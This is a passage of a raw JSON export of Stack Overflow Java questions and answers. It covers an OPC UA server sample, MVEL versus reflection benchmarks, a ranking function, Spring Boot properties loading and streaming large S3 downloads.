shutdown&quot;);\n    Scanner sc = new Scanner(System.in);\n    sc.nextLine(); // blocks until input given\n    System.out.println(&quot;Shutting down..&quot;);\n    server.shutdown(2, new LocalizedText(&quot;Shutdown by user&quot;));\n    System.out.println(&quot;Server stopped.&quot;);\n  }\n\n  /**\n   * Define a minimal ApplicationIdentity.\n   */\n  private static void initializeApplicationIdentity(UaServer server)\n      throws SecureIdentityException, IOException, UnknownHostException {\n    ApplicationDescription appDescription = new ApplicationDescription();\n    appDescription.setApplicationName(new LocalizedText(&quot;SimpleServer&quot;, Locale.ENGLISH));\n\n    appDescription.setApplicationUri(&quot;urn:localhost:UA:SimpleServer&quot;);\n    appDescription.setProductUri(&quot;urn:prosysopc.com:UA:SimpleServer&quot;);\n    appDescription.setApplicationType(ApplicationType.Server);\n\n    File privateKeyPath = new File(&quot;PKI/CA/private&quot;);\n    String organization = &quot;Sample Organization&quot;;\n    String privateKeyPassword = &quot;opcua&quot;;\n    ApplicationIdentity identity = ApplicationIdentity.loadOrCreateCertificate(appDescription, organization,\n        privateKeyPassword, privateKeyPath, true);\n    server.setApplicationIdentity(identity);\n  }\n\n} ```\n</code></pre>\n"},{"tags":["java","reflection","mvel"],"answers":[{"tags":[],"owner":{"account_id":21055914,"reputation":1,"user_id":15475183,"display_name":"Jayesh Prajapati"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1640260603,"creation_date":1640237964,"answer_id":70458069,"question_id":37434278,"body_markdown":"|Records|From Json|From Dto|To Dto\r\n|-------|--------:|-------:|-----:\r\n|&lt;b&gt;With Getter/Setter&lt;/b&gt;|7,335,792.22|1,130,815.56|1,239,896.67\r\n|10|49,263.33|16,240.00|13,446.67\r\n|1000|392,000.00|93,250.00|84,123.33\r\n|100000|21,566,113.33|3,282,956.67|3,622,120.00\r\n|&lt;b&gt;With Reflection&lt;/b&gt;|26,754,304.44|15,027,837.78|15,356,792.22\r\n|10|136,566.67|63,640.00|52,193.33\r\n|1000|1,294,553.33|618,830.00|542,986.67\r\n|100000|78,831,793.33|44,401,043.33|45,475,196.67\r\n|&lt;b&gt;With Mvel&lt;/b&gt;|36,520,687.78|50,511,424.44|50,790,170.00\r\n|10|5,707,033.33|515,293.33|463,266.67\r\n|1000|1,535,563.33|1,850,083.33|1,838,030.00\r\n|100000|102,319,466.67|149,168,896.67|150,069,213.33\r\n\r\n\r\nThe below image shows stats corresponding to a small test code that measures the performance of three different approaches to access members of a POJO.\r\n\r\n1) With Getter/Setters\r\n2) With Reflection\r\n3) With Mvel compiled expression\r\n\r\n[![][1]][1]\r\n\r\nFor each approach, there were three record sets viz., 10 records, 1000 records and 100,000 records. Each record set was executed 30 times and relevant measurement is taken as average in nanoseconds.\r\n\r\n  [1]: https://i.stack.imgur.com/mhmwA.png","title":"MVEL vs reflection. What is generally faster regarding object member access?","body":"<div class=\"s-table-container\">\n<table class=\"s-table\">\n<thead>\n<tr>\n<th>Records</th>\n<th style=\"text-align: right;\">From Json</th>\n<th style=\"text-align: right;\">From Dto</th>\n<th style=\"text-align: right;\">To Dto</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><b>With Getter/Setter</b></td>\n<td style=\"text-align: right;\">7,335,792.22</td>\n<td style=\"text-align: right;\">1,130,815.56</td>\n<td style=\"text-align: right;\">1,239,896.67</td>\n</tr>\n<tr>\n<td>10</td>\n<td style=\"text-align: right;\">49,263.33</td>\n<td style=\"text-align: right;\">16,240.00</td>\n<td style=\"text-align: right;\">13,446.67</td>\n</tr>\n<tr>\n<td>1000</td>\n<td style=\"text-align: right;\">392,000.00</td>\n<td style=\"text-align: right;\">93,250.00</td>\n<td style=\"text-align: right;\">84,123.33</td>\n</tr>\n<tr>\n<td>100000</td>\n<td style=\"text-align: right;\">21,566,113.33</td>\n<td style=\"text-align: right;\">3,282,956.67</td>\n<td style=\"text-align: right;\">3,622,120.00</td>\n</tr>\n<tr>\n<td><b>With Reflection</b></td>\n<td style=\"text-align: right;\">26,754,304.44</td>\n<td style=\"text-align: right;\">15,027,837.78</td>\n<td style=\"text-align: right;\">15,356,792.22</td>\n</tr>\n<tr>\n<td>10</td>\n<td style=\"text-align: right;\">136,566.67</td>\n<td style=\"text-align: right;\">63,640.00</td>\n<td style=\"text-align: right;\">52,193.33</td>\n</tr>\n<tr>\n<td>1000</td>\n<td style=\"text-align: right;\">1,294,553.33</td>\n<td style=\"text-align: right;\">618,830.00</td>\n<td style=\"text-align: right;\">542,986.67</td>\n</tr>\n<tr>\n<td>100000</td>\n<td style=\"text-align: right;\">78,831,793.33</td>\n<td style=\"text-align: right;\">44,401,043.33</td>\n<td style=\"text-align: right;\">45,475,196.67</td>\n</tr>\n<tr>\n<td><b>With Mvel</b></td>\n<td style=\"text-align: right;\">36,520,687.78</td>\n<td style=\"text-align: right;\">50,511,424.44</td>\n<td style=\"text-align: right;\">50,790,170.00</td>\n</tr>\n<tr>\n<td>10</td>\n<td style=\"text-align: right;\">5,707,033.33</td>\n<td style=\"text-align: right;\">515,293.33</td>\n<td style=\"text-align: right;\">463,266.67</td>\n</tr>\n<tr>\n<td>1000</td>\n<td style=\"text-align: right;\">1,535,563.33</td>\n<td style=\"text-align: right;\">1,850,083.33</td>\n<td style=\"text-align: right;\">1,838,030.00</td>\n</tr>\n<tr>\n<td>100000</td>\n<td style=\"text-align: right;\">102,319,466.67</td>\n<td style=\"text-align: right;\">149,168,896.67</td>\n<td style=\"text-align: right;\">150,069,213.33</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p>The below image shows stats corresponding to a small test code that measures the performance of three different approaches to access members of a POJO.</p>\n<ol>\n<li>With Getter/Setters</li>\n<li>With Reflection</li>\n<li>With Mvel compiled expression</li>\n</ol>\n<p><a href=\"https://i.stack.imgur.com/mhmwA.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/mhmwA.png\" alt=\"\" /></a></p>\n<p>For each approach, there were three record sets viz., 10 records, 1000 records and 100,000 records. Each record set was executed 30 times and relevant measurement is taken as average in nanoseconds.</p>\n"}],"owner":{"account_id":201558,"reputation":20189,"user_id":448078,"accept_rate":61,"display_name":"Mike"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":472,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":1,"score":1,"last_activity_date":1640260603,"creation_date":1464171786,"question_id":37434278,"body_markdown":"What is generally faster regarding object member access?  \r\n1. Execute compiled mvel expression  \r\n2. Execute cached reflection method","title":"MVEL vs reflection. What is generally faster regarding object member access?","body":"<p>What is generally faster regarding object member access?<br>\n1. Execute compiled mvel expression<br>\n2. Execute cached reflection method</p>\n"},{"tags":["java","sorting","ranking","ranking-functions"],"answers":[{"tags":[],"owner":{"account_id":22847687,"reputation":30,"user_id":16993807,"display_name":"DanE"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1640260418,"creation_date":1640260418,"answer_id":70461810,"question_id":70460414,"body_markdown":"First you should convert your array to list,because with an array it&#39;s nearly impossible to solve this problem. There is the solution\r\n```\r\nList&lt;Double&gt; array = new ArrayList();\r\n        Collections.addAll(array = new ArrayList&lt;Double&gt;(), 48425.41897186, 49791.74686595, 50637.6692345, 51287.48403098,\r\n                51799.4937794, 52261.37861867, 52656.14894694, 53016.05001912,\r\n                53319.51413285, 53613.1572321, 53884.85189549, 54133.26576367,\r\n                54369.24268884, 54602.45429572, 54824.0431121, 55028.76273135,\r\n                55225.52231596, 55422.08148893, 55614.70856782, 55790.25574904,\r\n                55966.69616331, 56130.87364057, 56296.84241876, 56449.88078966,\r\n                56608.27073321, 56765.40364215, 56921.28268835, 57077.1635885,\r\n                57222.81105772, 57368.09444527, 57504.20581419, 57642.81117631,\r\n                57783.76446837, 57921.46851864, 58065.22310307, 58200.13860351,\r\n                58325.12910768, 58462.47722569, 58595.54625497, 58726.54371695,\r\n                58851.6376891, 58985.00769808, 59119.15752146, 59248.91267942,\r\n                59377.08378369, 59504.93791765, 59633.1467344, 59763.72088164,\r\n                59886.39027783, 60019.02739838, 60147.06211421, 60278.91505155,\r\n                60400.41707501, 60526.78944757, 60651.09681352, 60773.59377531,\r\n                60903.3130914, 61035.07430937, 61161.05200311, 61286.28399277,\r\n                61419.73128784, 61548.88168331, 61678.23125819, 61817.95792148,\r\n                61948.2306147, 62091.7046512, 62226.53485998, 62367.68337618,\r\n                62504.82268713, 62644.56529322, 62791.4105829, 62937.55206985,\r\n                63094.47498604, 63249.99101185, 63405.82395567, 63558.83126992,\r\n                63730.35479375, 63893.18410211, 64063.05247982, 64234.61509263,\r\n                64418.23843848, 64606.76243476, 64800.75451622, 65009.26210584,\r\n                65219.78865272, 65435.37137585, 65684.50945914, 65933.51808688,\r\n                66192.20550111, 66475.37401097, 66770.66277284, 67101.61275613,\r\n                67448.96286764, 67844.22369744, 68294.14575387, 68836.7503846,\r\n                69484.01436583, 70336.85011311, 71689.84667803, 82113.06510423);\r\n\r\n        List&lt;Double&gt; dataPoit_list = new ArrayList();\r\n        dataPoit_list.add(40425.00);\r\n        dataPoit_list.add(53590.00);\r\n        dataPoit_list.add(54622.00);\r\n        dataPoit_list.add(56802.00);\r\n        dataPoit_list.add(50664.00);\r\n        dataPoit_list.add(58086.00);\r\n        dataPoit_list.add(59624.00);\r\n        dataPoit_list.add(52641.00);\r\n        \r\n        for (int i = 1; i &lt;array.size(); i++) {\r\n            for(Double x: dataPoit_list){\r\n                if(array.get(i)&gt;x&amp;&amp;array.get(i-1)&lt;x){\r\n                    array.add(array.indexOf(array.get(i)),x);\r\n                 }\r\n                else if(array.get(0)&gt;x){\r\n                    array.add(0,x);\r\n                }\r\n            }\r\n        }\r\n        for (int i = 0; i &lt;array.size(); i++) {\r\n            for (Double x:dataPoit_list) {\r\n                if(array.get(i).equals(x)){\r\n                    System.out.println(&quot;The placement of the values from the dataPoit_list (The value is the nth element of the first array): &quot;+(array.indexOf(array.get(i))+1));\r\n                }\r\n            }\r\n        }`","title":"Rank function for a number or an array","body":"<p>First you should convert your array to list,because with an array it's nearly impossible to solve this problem. There is the solution</p>\n<pre><code>List&lt;Double&gt; array = new ArrayList();\n        Collections.addAll(array = new ArrayList&lt;Double&gt;(), 48425.41897186, 49791.74686595, 50637.6692345, 51287.48403098,\n                51799.4937794, 52261.37861867, 52656.14894694, 53016.05001912,\n                53319.51413285, 53613.1572321, 53884.85189549, 54133.26576367,\n                54369.24268884, 54602.45429572, 54824.0431121, 55028.76273135,\n                55225.52231596, 55422.08148893, 55614.70856782, 55790.25574904,\n                55966.69616331, 56130.87364057, 56296.84241876, 56449.88078966,\n                56608.27073321, 56765.40364215, 56921.28268835, 57077.1635885,\n                57222.81105772, 57368.09444527, 57504.20581419, 57642.81117631,\n                57783.76446837, 57921.46851864, 58065.22310307, 58200.13860351,\n                58325.12910768, 58462.47722569, 58595.54625497, 58726.54371695,\n                58851.6376891, 58985.00769808, 59119.15752146, 59248.91267942,\n                59377.08378369, 59504.93791765, 59633.1467344, 59763.72088164,\n                59886.39027783, 60019.02739838, 60147.06211421, 60278.91505155,\n                60400.41707501, 60526.78944757, 60651.09681352, 60773.59377531,\n                60903.3130914, 61035.07430937, 61161.05200311, 61286.28399277,\n                61419.73128784, 61548.88168331, 61678.23125819, 61817.95792148,\n                61948.2306147, 62091.7046512, 62226.53485998, 62367.68337618,\n                62504.82268713, 62644.56529322, 62791.4105829, 62937.55206985,\n                63094.47498604, 63249.99101185, 63405.82395567, 63558.83126992,\n                63730.35479375, 63893.18410211, 64063.05247982, 64234.61509263,\n                64418.23843848, 64606.76243476, 64800.75451622, 65009.26210584,\n                65219.78865272, 65435.37137585, 65684.50945914, 65933.51808688,\n                66192.20550111, 66475.37401097, 66770.66277284, 67101.61275613,\n                67448.96286764, 67844.22369744, 68294.14575387, 68836.7503846,\n                69484.01436583, 70336.85011311, 71689.84667803, 82113.06510423);\n\n        List&lt;Double&gt; dataPoit_list = new ArrayList();\n        dataPoit_list.add(40425.00);\n        dataPoit_list.add(53590.00);\n        dataPoit_list.add(54622.00);\n        dataPoit_list.add(56802.00);\n        dataPoit_list.add(50664.00);\n        dataPoit_list.add(58086.00);\n        dataPoit_list.add(59624.00);\n        dataPoit_list.add(52641.00);\n        \n        for (int i = 1; i &lt;array.size(); i++) {\n            for(Double x: dataPoit_list){\n                if(array.get(i)&gt;x&amp;&amp;array.get(i-1)&lt;x){\n                    array.add(array.indexOf(array.get(i)),x);\n                 }\n                else if(array.get(0)&gt;x){\n                    array.add(0,x);\n                }\n            }\n        }\n        for (int i = 0; i &lt;array.size(); i++) {\n            for (Double x:dataPoit_list) {\n                if(array.get(i).equals(x)){\n                    System.out.println(&quot;The placement of the values from the dataPoit_list (The value is the nth element of the first array): &quot;+(array.indexOf(array.get(i))+1));\n                }\n            }\n        }`\n</code></pre>\n"}],"owner":{"account_id":10161899,"reputation":140,"user_id":10598286,"display_name":"Irfan Yaqub"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":177,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":1,"score":1,"last_activity_date":1640260418,"creation_date":1640253369,"question_id":70460414,"body_markdown":"I am making the player ranking system. Every player finishes the game in minimum time. To make the system, I have generated a random array of 100 numbers. Now I want to have the second array of let&#39;s say 5 elements. Which will be the random array also and I want to rand these five elements which may not be in that array of may be in between the consecutive numbers.\r\n\r\n    array([48425.41897186, 49791.74686595, 50637.6692345 , 51287.48403098,\r\n       51799.4937794 , 52261.37861867, 52656.14894694, 53016.05001912,\r\n       53319.51413285, 53613.1572321 , 53884.85189549, 54133.26576367,\r\n       54369.24268884, 54602.45429572, 54824.0431121 , 55028.76273135,\r\n       55225.52231596, 55422.08148893, 55614.70856782, 55790.25574904,\r\n       55966.69616331, 56130.87364057, 56296.84241876, 56449.88078966,\r\n       56608.27073321, 56765.40364215, 56921.28268835, 57077.1635885 ,\r\n       57222.81105772, 57368.09444527, 57504.20581419, 57642.81117631,\r\n       57783.76446837, 57921.46851864, 58065.22310307, 58200.13860351,\r\n       58325.12910768, 58462.47722569, 58595.54625497, 58726.54371695,\r\n       58851.6376891 , 58985.00769808, 59119.15752146, 59248.91267942,\r\n       59377.08378369, 59504.93791765, 59633.1467344 , 59763.72088164,\r\n       59886.39027783, 60019.02739838, 60147.06211421, 60278.91505155,\r\n       60400.41707501, 60526.78944757, 60651.09681352, 60773.59377531,\r\n       60903.3130914 , 61035.07430937, 61161.05200311, 61286.28399277,\r\n       61419.73128784, 61548.88168331, 61678.23125819, 61817.95792148,\r\n       61948.2306147 , 62091.7046512 , 62226.53485998, 62367.68337618,\r\n       62504.82268713, 62644.56529322, 62791.4105829 , 62937.55206985,\r\n       63094.47498604, 63249.99101185, 63405.82395567, 63558.83126992,\r\n       63730.35479375, 63893.18410211, 64063.05247982, 64234.61509263,\r\n       64418.23843848, 64606.76243476, 64800.75451622, 65009.26210584,\r\n       65219.78865272, 65435.37137585, 65684.50945914, 65933.51808688,\r\n       66192.20550111, 66475.37401097, 66770.66277284, 67101.61275613,\r\n       67448.96286764, 67844.22369744, 68294.14575387, 68836.7503846 ,\r\n       69484.01436583, 70336.85011311, 71689.84667803, 82113.06510423])\r\n\r\n&gt; Here is the array that I want to rank. \r\n\r\n        dataPoit_list.add(40425.00);\r\n        dataPoit_list.add(53590.00);\r\n        dataPoit_list.add(54622.00);\r\n        dataPoit_list.add(56802.00);\r\n        dataPoit_list.add(50664.00);\r\n        dataPoit_list.add(58086.00);\r\n        dataPoit_list.add(59624.00);\r\n        dataPoit_list.add(52641.00);\r\n\r\n&gt; The first element is not in the array. It means the player finished the race really fast. The second element is between two numbers. Is there any ranking function in java?\r\nif now how can I make this ranking system? It&#39;s a very common question but I could not find a single solution here.\r\n\r\n","title":"Rank function for a number or an array","body":"<p>I am making the player ranking system. Every player finishes the game in minimum time. To make the system, I have generated a random array of 100 numbers. Now I want to have the second array of let's say 5 elements. Which will be the random array also and I want to rand these five elements which may not be in that array of may be in between the consecutive numbers.</p>\n<pre><code>array([48425.41897186, 49791.74686595, 50637.6692345 , 51287.48403098,\n   51799.4937794 , 52261.37861867, 52656.14894694, 53016.05001912,\n   53319.51413285, 53613.1572321 , 53884.85189549, 54133.26576367,\n   54369.24268884, 54602.45429572, 54824.0431121 , 55028.76273135,\n   55225.52231596, 55422.08148893, 55614.70856782, 55790.25574904,\n   55966.69616331, 56130.87364057, 56296.84241876, 56449.88078966,\n   56608.27073321, 56765.40364215, 56921.28268835, 57077.1635885 ,\n   57222.81105772, 57368.09444527, 57504.20581419, 57642.81117631,\n   57783.76446837, 57921.46851864, 58065.22310307, 58200.13860351,\n   58325.12910768, 58462.47722569, 58595.54625497, 58726.54371695,\n   58851.6376891 , 58985.00769808, 59119.15752146, 59248.91267942,\n   59377.08378369, 59504.93791765, 59633.1467344 , 59763.72088164,\n   59886.39027783, 60019.02739838, 60147.06211421, 60278.91505155,\n   60400.41707501, 60526.78944757, 60651.09681352, 60773.59377531,\n   60903.3130914 , 61035.07430937, 61161.05200311, 61286.28399277,\n   61419.73128784, 61548.88168331, 61678.23125819, 61817.95792148,\n   61948.2306147 , 62091.7046512 , 62226.53485998, 62367.68337618,\n   62504.82268713, 62644.56529322, 62791.4105829 , 62937.55206985,\n   63094.47498604, 63249.99101185, 63405.82395567, 63558.83126992,\n   63730.35479375, 63893.18410211, 64063.05247982, 64234.61509263,\n   64418.23843848, 64606.76243476, 64800.75451622, 65009.26210584,\n   65219.78865272, 65435.37137585, 65684.50945914, 65933.51808688,\n   66192.20550111, 66475.37401097, 66770.66277284, 67101.61275613,\n   67448.96286764, 67844.22369744, 68294.14575387, 68836.7503846 ,\n   69484.01436583, 70336.85011311, 71689.84667803, 82113.06510423])\n</code></pre>\n<blockquote>\n<p>Here is the array that I want to rank.</p>\n</blockquote>\n<pre><code>    dataPoit_list.add(40425.00);\n    dataPoit_list.add(53590.00);\n    dataPoit_list.add(54622.00);\n    dataPoit_list.add(56802.00);\n    dataPoit_list.add(50664.00);\n    dataPoit_list.add(58086.00);\n    dataPoit_list.add(59624.00);\n    dataPoit_list.add(52641.00);\n</code></pre>\n<blockquote>\n<p>The first element is not in the array. It means the player finished the race really fast. The second element is between two numbers. Is there any ranking function in java?\nif now how can I make this ranking system? It's a very common question but I could not find a single solution here.</p>\n</blockquote>\n"},{"tags":["java","spring","spring-boot","spring-annotations"],"answers":[{"tags":[],"owner":{"account_id":7268261,"reputation":194,"user_id":5878559,"display_name":"Nikhil Pandit"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1640260068,"creation_date":1640260068,"answer_id":70461746,"question_id":70461673,"body_markdown":"You might want to refer to this. It would be helpful in you case.\r\nLink: https://www.baeldung.com/properties-with-spring\r\n\r\n\r\nDeclare properties as: \r\n\r\n    @Configuration\r\n    @PropertySource(&quot;classpath:foo.properties&quot;)\r\n    public class PropertiesWithJavaConfig {\r\n        //...\r\n    }\r\n\r\n\r\nUse them in other clases as :\r\nExample 1: \r\n\r\n    @Value( &quot;${jdbc.url}&quot; )\r\n    private String jdbcUrl;\r\n\r\nExample 2:\r\n\r\n    @Autowired\r\n    private Environment env;\r\n    ...\r\n    dataSource.setUrl(env.getProperty(&quot;jdbc.url&quot;));\r\n\r\n\r\nNote: Code snippets are from the link provided in answer.\r\nCredits to Baeldung.","title":"Import a .properties file into a java.util.Properties type variable in Configuration class via annotation","body":"<p>You might want to refer to this. It would be helpful in you case.\nLink: <a href=\"https://www.baeldung.com/properties-with-spring\" rel=\"nofollow noreferrer\">https://www.baeldung.com/properties-with-spring</a></p>\n<p>Declare properties as:</p>\n<pre><code>@Configuration\n@PropertySource(&quot;classpath:foo.properties&quot;)\npublic class PropertiesWithJavaConfig {\n    //...\n}\n</code></pre>\n<p>Use them in other clases as :\nExample 1:</p>\n<pre><code>@Value( &quot;${jdbc.url}&quot; )\nprivate String jdbcUrl;\n</code></pre>\n<p>Example 2:</p>\n<pre><code>@Autowired\nprivate Environment env;\n...\ndataSource.setUrl(env.getProperty(&quot;jdbc.url&quot;));\n</code></pre>\n<p>Note: Code snippets are from the link provided in answer.\nCredits to Baeldung.</p>\n"}],"owner":{"account_id":15209330,"reputation":37,"user_id":10974668,"display_name":"iWIllChange"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":856,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1640260068,"creation_date":1640259666,"question_id":70461673,"body_markdown":"I am migrating my java application from spring to spring boot and along with it I want to **eradicate the xml based configuration** and move to **annotation based configuration** completely.\r\n\r\nI want to load a properties file **as is** into a **java.util.Properties** type variable.\r\n\r\n\r\n\r\n```\r\n@Configuration\r\npublic class ApplicationConfig\r\n{\r\n  // inject the file into this variable\r\n  private Properties myOtherProp;\r\n}\r\n```\r\nIn xml based configuration this was done in a line by:\r\n```\r\n&lt;util:properties id=&quot;myOtherProp&quot; location=&quot;classpath:myOtherProperties.properties&quot;/&gt;\r\n```\r\n\r\nand the way I am achieving this currently is by doing this:\r\n```\r\n@Configuration\r\npublic class ApplicationConfig\r\n{\r\n  private Properties myOtherProp;\r\n\r\n  private void myMethodToInitialiseMyOtherProp()\r\n  {\r\n    myOtherProp = new Properties();\r\n    myOtherProp.load(getClass().getClassLoader().getResourceAsStream(&quot;myOtherProperties.properties&quot;));\r\n  }\r\n\r\n  @Bean\r\n  public myClass beanWhichUsesTheOtherProp()\r\n  {\r\n    myMethodToInitialiseMyOtherProp();\r\n    return new myClass(myOtherProp);\r\n  }\r\n}\r\n```\r\n\r\nI am searching for a solution to do this in one line like how ```@Value``` does for primitive data types.\r\nOr at least being able to call my method - myMethodToInitialiseMyOtherProp() where I declare the Properties variable so that I can remove the overhead of remembering to call the function to initialise the variable before using it for the first time anywhere.\r\n\r\nI am aware of how to inject the individual fields declared inside myOtherProperties.properties but that is not what I am trying to achieve here. I wish to load the entire file into the variable - myOtherProp of type Properties.\r\n\r\nSomething like this:\r\n```\r\n@Configuration\r\npublic class ApplicationConfig\r\n{\r\n  // inject the file into this variable\r\n  @Something-Like-Value-Annotation-To-Inject-The-File-In-One-Line\r\n  // OR //\r\n  @Some-Way-To-Call-myMethodToInitialiseMyOtherProp()\r\n  private Properties myOtherProp;\r\n}\r\n```","title":"Import a .properties file into a java.util.Properties type variable in Configuration class via annotation","body":"<p>I am migrating my java application from spring to spring boot and along with it I want to <strong>eradicate the xml based configuration</strong> and move to <strong>annotation based configuration</strong> completely.</p>\n<p>I want to load a properties file <strong>as is</strong> into a <strong>java.util.Properties</strong> type variable.</p>\n<pre><code>@Configuration\npublic class ApplicationConfig\n{\n  // inject the file into this variable\n  private Properties myOtherProp;\n}\n</code></pre>\n<p>In xml based configuration this was done in a line by:</p>\n<pre><code>&lt;util:properties id=&quot;myOtherProp&quot; location=&quot;classpath:myOtherProperties.properties&quot;/&gt;\n</code></pre>\n<p>and the way I am achieving this currently is by doing this:</p>\n<pre><code>@Configuration\npublic class ApplicationConfig\n{\n  private Properties myOtherProp;\n\n  private void myMethodToInitialiseMyOtherProp()\n  {\n    myOtherProp = new Properties();\n    myOtherProp.load(getClass().getClassLoader().getResourceAsStream(&quot;myOtherProperties.properties&quot;));\n  }\n\n  @Bean\n  public myClass beanWhichUsesTheOtherProp()\n  {\n    myMethodToInitialiseMyOtherProp();\n    return new myClass(myOtherProp);\n  }\n}\n</code></pre>\n<p>I am searching for a solution to do this in one line like how <code>@Value</code> does for primitive data types.\nOr at least being able to call my method - myMethodToInitialiseMyOtherProp() where I declare the Properties variable so that I can remove the overhead of remembering to call the function to initialise the variable before using it for the first time anywhere.</p>\n<p>I am aware of how to inject the individual fields declared inside myOtherProperties.properties but that is not what I am trying to achieve here. I wish to load the entire file into the variable - myOtherProp of type Properties.</p>\n<p>Something like this:</p>\n<pre><code>@Configuration\npublic class ApplicationConfig\n{\n  // inject the file into this variable\n  @Something-Like-Value-Annotation-To-Inject-The-File-In-One-Line\n  // OR //\n  @Some-Way-To-Call-myMethodToInitialiseMyOtherProp()\n  private Properties myOtherProp;\n}\n</code></pre>\n"},{"tags":["java","amazon-s3","gzip","aws-sdk"],"comments":[{"owner":{"account_id":2432789,"reputation":984,"user_id":2123347,"accept_rate":50,"display_name":"JHDev"},"score":0,"creation_date":1615462236,"post_id":66581526,"comment_id":117700488,"body_markdown":"can you please put the trace of exception ?","body":"can you please put the trace of exception ?"},{"owner":{"account_id":9365930,"reputation":470,"user_id":6950847,"display_name":"zeg"},"score":0,"creation_date":1615464004,"post_id":66581526,"comment_id":117701248,"body_markdown":"I guess this line causes the heap to use up `Files.readAllBytes(path)` since you try to read the large file at once into a java File Object which is propably to large. Include the stack trace to see where exactly it occurs","body":"I guess this line causes the heap to use up <code>Files.readAllBytes(path)</code> since you try to read the large file at once into a java File Object which is propably to large. Include the stack trace to see where exactly it occurs"},{"owner":{"account_id":20884315,"reputation":11,"user_id":15341257,"display_name":"virajw"},"score":1,"creation_date":1615869502,"post_id":66581526,"comment_id":117818773,"body_markdown":"@zeg thanks for the advices. I have fixed this using chunks.","body":"@zeg thanks for the advices. I have fixed this using chunks."}],"answers":[{"tags":[],"owner":{"account_id":8806448,"reputation":1279,"user_id":6580933,"display_name":"Terblanche Daniel"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1640259702,"creation_date":1640259702,"answer_id":70461678,"question_id":66581526,"body_markdown":"You can have a look at [this][1] answer and stream it so it&#39;s not loaded into memory.\r\n\r\n\r\n\r\n```[java]\r\n  @GetMapping(value = &quot;/downloadfile/**&quot;, produces = { MediaType.APPLICATION_OCTET_STREAM_VALUE })\r\n    public ResponseEntity&lt;S3ObjectInputStream&gt; downloadFile(HttpServletRequest request) {\r\n       //reads the content from S3 bucket and returns a S3ObjectInputStream\r\n       S3Object object = publishAmazonS3.getObject(&quot;12345bucket&quot;, &quot;/logs/file1.log&quot;);\r\n       S3ObjectInputStream finalObject = object.getObjectContent();\r\n\r\n        final StreamingResponseBody body = outputStream -&gt; {\r\n            int numberOfBytesToWrite = 0;\r\n            byte[] data = new byte[1024];\r\n            while ((numberOfBytesToWrite = finalObject.read(data, 0, data.length)) != -1) {\r\n                System.out.println(&quot;Writing some bytes..&quot;);\r\n                outputStream.write(data, 0, numberOfBytesToWrite);\r\n            }\r\n            finalObject.close();\r\n        };\r\n        return new ResponseEntity&lt;&gt;(body, HttpStatus.OK);\r\n    }\r\n```\r\n\r\n\r\n  [1]: https://stackoverflow.com/a/58947904/6580933","title":"Amazon sdk dowload large zip file from s3 bucket in spring boot java","body":"<p>You can have a look at <a href=\"https://stackoverflow.com/a/58947904/6580933\">this</a> answer and stream it so it's not loaded into memory.</p>\n<pre><code>  @GetMapping(value = &quot;/downloadfile/**&quot;, produces = { MediaType.APPLICATION_OCTET_STREAM_VALUE })\n    public ResponseEntity&lt;S3ObjectInputStream&gt; downloadFile(HttpServletRequest request) {\n       //reads the content from S3 bucket and returns a S3ObjectInputStream\n       S3Object object = publishAmazonS3.getObject(&quot;12345bucket&quot;, &quot;/logs/file1.log&quot;);\n       S3ObjectInputStream finalObject = object.getObjectContent();\n\n        final StreamingResponseBody body = outputStream -&gt; {\n            int numberOfBytesToWrite = 0;\n            byte[] data = new byte[1024];\n            while ((numberOfBytesToWrite = finalObject.read(data, 0, data.length)) != -1) {\n                System.out.println(&quot;Writing some bytes..&quot;);\n                outputStream.write(data, 0, numberOfBytesToWrite);\n            }\n            finalObject.close();\n        };\n        return new ResponseEntity&lt;&gt;(body, HttpStatus.OK);\n    }\n</code></pre>\n"}],"owner":{"account_id":20884315,"reputation":11,"user_id":15341257,"display_name":"virajw"},"comment_count":3,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":1092,"favorite_count":0,"down_vote_count":1,"up_vote_count":1,"answer_count":1,"score":0,"last_activity_date":1640259702,"creation_date":1615461548,"question_id":66581526,"body_markdown":"What I did was trying to download large data zip file from s3 bucket\r\n\r\n            S3ObjectInputStream inputStreams = s3object.getObjectContent(); \r\n            File newFile = new File(zipFileTempLocation + File.separator + CommonConstant.FILE_NAME);\r\n            FileOutputStream fileOutputStream = new FileOutputStream(newFile);\r\n            GZIPInputStream gzipInputStream = new GZIPInputStream(inputStream);\r\n            LOGGER.info(&quot;staring to write {}&quot;, newFile.toPath());\r\n            byte[] buffer = new byte[5000];\r\n            int le\r\n            while ((len = gzipInputStream.read(buffer)) &gt; 0) {\r\n                fileOutputStream.write(buffer, 0, len);\r\n            }\r\n            gzipInputStream.close();\r\n            String newFileURl = newFile.getAbsolutePath();\r\n            Path path = Paths.get(url);\r\n            return Files.readAllBytes(path);\r\n}\r\n\r\nwhen I trying to run my service it says out of heap memory error. Can you help me with this ? ","title":"Amazon sdk dowload large zip file from s3 bucket in spring boot java","body":"<p>What I did was trying to download large data zip file from s3 bucket</p>\n<pre><code>        S3ObjectInputStream inputStreams = s3object.getObjectContent(); \n        File newFile = new File(zipFileTempLocation + File.separator + CommonConstant.FILE_NAME);\n        FileOutputStream fileOutputStream = new FileOutputStream(newFile);\n        GZIPInputStream gzipInputStream = new GZIPInputStream(inputStream);\n        LOGGER.info(&quot;staring to write {}&quot;, newFile.toPath());\n        byte[] buffer = new byte[5000];\n        int le\n        while ((len = gzipInputStream.read(buffer)) &gt; 0) {\n            fileOutputStream.write(buffer, 0, len);\n        }\n        gzipInputStream.close();\n        String newFileURl = newFile.getAbsolutePath();\n        Path path = Paths.get(url);\n        return 